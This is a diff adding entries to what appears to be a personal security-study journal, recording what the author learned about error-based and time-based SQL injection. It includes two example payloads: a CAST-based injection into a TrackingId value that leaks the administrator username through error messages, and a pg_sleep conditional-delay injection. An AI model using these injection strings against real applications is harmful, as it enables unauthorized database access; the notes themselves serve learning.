@@ -292,3 +292,31 @@
 * I am having problems in creating regex expressions to filter meaningful urls.
 * Apparently the archive urls also contain bogus payloads from scanner tools and scrapers, need to filter them out too.
 ---
+### **December 28, 2025**
+**Went out for a family trip**
+---
+### **December 29, 2025**
+**Took rest**
+---
+
+### **December 30, 2025**
+**Today's Focus**
+* Learn about error-based sql injection.
+* Learn about time based sql injection.
+
+**What I Learned ?**
+* I learned about how to leak information by inducing errors.
+```sql
+#suppose a query is like
+SELECT column1 FROM table1 WHERE TrackingID='';
+# The CAST function is used for converting data-types and some data can be leaked by inducing an error
+TrackingId=' AND CAST ((SELECT username FROM users WHERE username='administrator') AS int)--
+# Data could be reflected in the error message
+```
+* Sometimes the application might process every query and the errors in such a way that nothing gets reflected in the responses or in the behavior of the application.
+* In this case time based sql injection can be used to delay the response of the query which confirms the injection taking place.
+```sql
+TrackingId=1234cyz'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+```
+* If there is a delay of 10 seconds in the response, the injection took place successfully.
+---
